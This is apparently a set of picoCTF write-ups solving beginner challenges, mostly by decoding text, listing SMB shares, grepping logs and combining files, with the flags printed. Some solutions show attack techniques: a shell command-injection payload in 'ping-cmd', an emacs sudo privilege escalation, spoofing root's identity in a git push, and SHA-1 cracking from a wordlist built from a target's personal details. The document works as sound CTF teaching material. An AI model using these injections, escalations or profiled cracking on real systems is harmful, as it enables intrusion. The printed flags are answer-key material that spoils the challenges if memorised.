## Undo

> Can you reverse a series of Linux text transformations to recover the original flag?

```shell
$ nc foggy-cliff.picoctf.net 60486

===Welcome to the Text Transformations Challenge!===

Your goal: step by step, recover the original flag.
At each step, you'll see the transformed flag and a hint.
Enter the correct Linux command to reverse the last transformation.

--- Step 1 ---
Current flag: KXM5MzA0MG5zLWZhMDFnQHplMHNmYTRlRy1nazNnLXRhMWZlcmlyRShTR1BicHZj
Hint: Base64 encoded the string.
Enter the Linux command to reverse it: 

```

Steps :
- `base64 -d` : Base64 decoded
- `rev` : Reversed the text
- `tr '-' '_'` : Replaced underscores with dashes
- `tr '()' '{}'` : Replaced curly braces with parentheses
- Applied ROT13 to letters

```
picoCTF{Revers1ng_t3xt_Tr4nsf0rm@t10ns_fa04039f}
```

## MY GIT

> I have built my own Git server with my own rules!
> Check the README to get your flag!

README - 

```
# MyGit

### If you want the flag, make sure to push the flag!

Only flag.txt pushed by ```root:root@picoctf``` will be updated with the flag.

GOOD LUCK!
```

Created a empty file `flag.txt` and - 

```shell
$ git add .

$ git -c "user.name=root" -c "user.email=root@picoctf" push
```

Flag - 

```
picoCTF{1mp3rs0n4t4_g17_345y_cd8540cd}
```

## bytemancy 1

> Can you conjure the right bytes?

Source Code - 

```python
while(True):
  try:
    print('⊹──────[ BYTEMANCY-1 ]──────⊹')
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print()
    print('Send me ASCII DECIMAL 101 1751 times, side-by-side, no space.')
    print()
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print('⊹─────────────⟡─────────────⊹')
    user_input = input('==> ')
    if user_input == "\x65"*1751:
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
      print()
      print()
      print()
  except Exception as e:
    print(e)
    break
```

Pipe - 

```shell
python3 -c 'print("e"*1751)' | nc foggy-cliff.picoctf.net 62809
```

```
picoCTF{h0w_m4ny_e's???_706320e0}
```

## Printer Shares

> Oops! Someone accidentally sent an important file to a network printer—can you retrieve it from the print server?

```shell
$ nc -vz mysterious-sea.picoctf.net 54508

DNS fwd/rev mismatch: mysterious-sea.picoctf.net != ec2-3-130-79-223.us-east-2.compute.amazonaws.com
mysterious-sea.picoctf.net [3.130.79.223] 54508 (?) open

```

The printer is on `54508`

SMB - 

```shell
smbclient -L //mysterious-sea.picoctf.net -p 54508 -N
```

```
	Sharename       Type      Comment
	---------       ----      -------
	shares          Disk      Public Share With Guests
	IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
```

```shell
smbclient //mysterious-sea.picoctf.net/shares -p 54508 -N
```

Flag - 

```
picoCTF{5mb_pr1nter_5h4re5_ac4c227e}
```

## ping-cmd

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?


```shell
$ nc mysterious-sea.picoctf.net 52672

Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=12.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=109 time=12.7 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.668/12.680/12.693/0.012 ms
```

```shell
$ nc mysterious-sea.picoctf.net 52672

Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 && ls
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=12.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=109 time=12.6 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.594/12.630/12.666/0.036 ms
flag.txt
script.sh
```

```shell
$ nc mysterious-sea.picoctf.net 52672
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8 && cat script.sh
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=109 time=12.6 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=109 time=12.7 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 12.626/12.647/12.669/0.021 ms
```

Source - 

```bash
#!/bin/bash
echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
read domain
bash -c "ping -c2 $domain"
```

Flag - 

```
8.8.8.8 && cat flag.txt
```

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_a9326567}
```

## bytemancy 0

> Can you conjure the right bytes? 

Source Code -

```python
while(True):
  try:
    print('⊹──────[ BYTEMANCY-0 ]──────⊹')
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print()
    print('Send me ASCII DECIMAL 101, 101, 101, side-by-side, no space.')
    print()
    print("☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐")
    print('⊹─────────────⟡─────────────⊹')
    user_input = input('==> ')
    if user_input == "\x65\x65\x65":
      print(open("./flag.txt", "r").read())
      break
    else:
      print("That wasn't it. I got: " + str(user_input))
      print()
      print()
      print()
  except Exception as e:
    print(e)
    break
```

Flag - 

```shell
$ python3 -c "print('e'*3)" | nc candy-mountain.picoctf.net 53147
⊹──────[ BYTEMANCY-0 ]──────⊹
☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐

Send me ASCII DECIMAL 101, 101, 101, side-by-side, no space.

☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐☉⟊☽☈⟁⧋⟡☍⟐
⊹─────────────⟡─────────────⊹
==> picoCTF{pr1n74813_ch4r5_1ade0c44}

```

## Piece by Piece

> After logging in, you will find multiple file parts in your home directory. These parts need to be combined and extracted to reveal the flag.

```
SSH to `dolphin-cove.picoctf.net`:`63559` and login as `ctf-player` with password `fa005713`.
```

Steps - 

```shell
ctf-player@pico-chall$ ls -la
total 28
drwxr-xr-x 1 ctf-player ctf-player  20 Aug 17 22:13 .
drwxr-xr-x 1 root       root        24 Feb  4  2026 ..
drwx------ 2 ctf-player ctf-player  34 Aug 17 22:13 .cache
-rw-r--r-- 1 root       root        67 Feb  4  2026 .profile
-rw-r--r-- 1 ctf-player ctf-player 282 Feb  4  2026 instructions.txt
-rw-r--r-- 1 ctf-player ctf-player  51 Feb  4  2026 part_aa
-rw-r--r-- 1 ctf-player ctf-player  51 Feb  4  2026 part_ab
-rw-r--r-- 1 ctf-player ctf-player  51 Feb  4  2026 part_ac
-rw-r--r-- 1 ctf-player ctf-player  51 Feb  4  2026 part_ad
-rw-r--r-- 1 ctf-player ctf-player  35 Feb  4  2026 part_ae

```

```shell
$ cat instructions.txt 
Hint:

- The flag is split into multiple parts as a zipped file.
- Use Linux commands to combine the parts into one file.
- The zip file is password protected. Use this "supersecret" password to extract the zip file.
- After unzipping, check the extracted text file for the flag.
```

Flag - 

```shell
$ cat part_aa part_ab part_ac part_ad part_ae > my.zip

$ unzip my.zip 
Archive:  my.zip
[my.zip] flag.txt password: 
 extracting: flag.txt

$ cat flag.txt 
picoCTF{z1p_and_spl1t_f1l3s_4r3_fun_8fa833a5}
```

## SUDO MAKE ME A SANDWICH

> Can you read the flag? I think you can!

```
`ssh -p 51033 [ctf-player@green-hill.picoctf.net](mailto:ctf-player@green-hill.picoctf.net)` using password `61ecc684`
```

```shell
$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
```

```shell
$ sudo /bin/emacs flag.txt
```

Flag - 

```
picoCTF{ju57_5ud0_17_4c6f730f}
```

## Password Profiler

> We intercepted a suspicious file from a system, but instead of the password itself, it only contains its SHA-1 hash. Using OSINT techniques, you are provided with personal details about the target. Your task is to leverage this information to generate a custom password list and recover the original password by matching its hash.

Clue - 

Personal details:

```
First Name: Alice
	Surname: Johnson
Nickname: AJ
Birthdate: 15-07-1990
Partner's Name: Bob
Child's Name: Charlie
```

SHA-1 hash of the password:

```
968c2349040273dd57dc4be7e238c5ac200ceac5
```

Script to test passwords against the hash:

```python
#!/usr/bin/env python3
import hashlib

HASH_FILE = "hash.txt"
WORDLIST_FILE = "passwords.txt" # wordlist that was generated using CUPP

def load_hash():
    with open(HASH_FILE, "r") as f:
        return f.read().strip()

def crack_password(target_hash):
    with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for password in f:
            password = password.strip()
            if hashlib.sha1(password.encode()).hexdigest() == target_hash:
                return password
    return None

if __name__ == "__main__":
    target_hash = load_hash()
    result = crack_password(target_hash)
    if result:
        print(f"Password found: picoCTF{{{result}}}")
    else:
        print("No match found.")
```

Ref:
- Common User Passwords Profiler - https://github.com/Mebus/cupp

Flag - 

```
Password found: picoCTF{Aj_15901990}
```

## MultiCode

> We intercepted a suspiciously encoded message, but it’s clearly hiding a flag. No encryption, just multiple layers of obfuscation. Can you peel back the layers and reveal the truth?

Message - 

```
NjM3NjcwNjI1MDQ3NTMyNTM3NDI2MTcyNjY2NzcyNzE1ZjcyNjE3MDMwNzE3NjYxNzQ1ZjMxNzEzNzM1NmY3MjM2MzMyNTM3NDQ=
```

Base64 decode - 

```shell
$ echo "NjM3NjcwNjI1MDQ3NTMyNTM3NDI2MTcyNjY2NzcyNzE1ZjcyNjE3MDMwNzE3NjYxNzQ1ZjMxNzEzNzM1NmY3MjM2MzMyNTM3NDQ=" | base64 -d

637670625047532537426172666772715f72617030717661745f317137356f723633253744
```

Hex to ASCII - 

```shell
$ echo "637670625047532537426172666772715f72617030717661745f317137356f723633253744" | xxd -r -p

cvpbPGS%7Barfgrq_rap0qvat_1q75or63%7D
```

ROT13 - 

```
picoCTF{nested_enc0ding_1d75be63}
```

## Log Hunt

> Our server seems to be leaking pieces of a secret flag in its logs. The parts are scattered and sometimes repeated. Can you reconstruct the original flag?
> Download the [logs](https://challenge-files.picoctf.net/c_amiable_citadel/49cec6157142f24a599f4164d5b63322c2494f801390d6f22eb91b3aa592bc66/server.log) and figure out the full flag from the fragments.

Flag - 

```shell
$ cat server.log | grep FLAGPART

[1990-08-09 10:00:10] INFO FLAGPART: picoCTF{us3_
[1990-08-09 10:02:55] INFO FLAGPART: y0urlinux_
[1990-08-09 10:05:54] INFO FLAGPART: sk1lls_
[1990-08-09 10:05:55] INFO FLAGPART: sk1lls_
[1990-08-09 10:10:54] INFO FLAGPART: cedfa5fb}
[1990-08-09 10:10:58] INFO FLAGPART: cedfa5fb}
[1990-08-09 10:11:06] INFO FLAGPART: cedfa5fb}
[1990-08-09 11:04:27] INFO FLAGPART: picoCTF{us3_
[1990-08-09 11:04:29] INFO FLAGPART: picoCTF{us3_
[1990-08-09 11:04:37] INFO FLAGPART: picoCTF{us3_
[1990-08-09 11:09:16] INFO FLAGPART: y0urlinux_
[1990-08-09 11:09:19] INFO FLAGPART: y0urlinux_
[1990-08-09 11:12:40] INFO FLAGPART: sk1lls_
[1990-08-09 11:12:45] INFO FLAGPART: sk1lls_
[1990-08-09 11:16:58] INFO FLAGPART: cedfa5fb}
[1990-08-09 11:16:59] INFO FLAGPART: cedfa5fb}
[1990-08-09 11:17:00] INFO FLAGPART: cedfa5fb}
[1990-08-09 12:19:23] INFO FLAGPART: picoCTF{us3_
[1990-08-09 12:19:29] INFO FLAGPART: picoCTF{us3_
[1990-08-09 12:19:32] INFO FLAGPART: picoCTF{us3_
[1990-08-09 12:23:43] INFO FLAGPART: y0urlinux_
[1990-08-09 12:23:45] INFO FLAGPART: y0urlinux_
[1990-08-09 12:23:53] INFO FLAGPART: y0urlinux_
[1990-08-09 12:25:32] INFO FLAGPART: sk1lls_
[1990-08-09 12:28:45] INFO FLAGPART: cedfa5fb}
[1990-08-09 12:28:49] INFO FLAGPART: cedfa5fb}
[1990-08-09 12:28:52] INFO FLAGPART: cedfa5fb}
```

```
picoCTF{us3_y0urlinux_sk1lls_cedfa5fb}
```

## FANTASY CTF

> Play this short game to get familiar with terminal applications and some of the most important rules in scope for picoCTF.

```
picoCTF{m1113n1um_3d1710n_2d78cdd9}
```

